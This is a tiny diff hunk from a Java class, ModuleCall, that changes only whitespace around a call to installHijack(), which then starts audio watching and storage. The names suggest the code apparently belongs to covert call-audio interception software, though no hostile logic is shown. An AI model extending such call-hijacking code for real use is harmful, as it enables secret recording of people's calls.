@@ -165,7 +165,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
 
-			if(installHijack()){
+			if (installHijack()){
 				startWatchAudio();
 			}
 		}
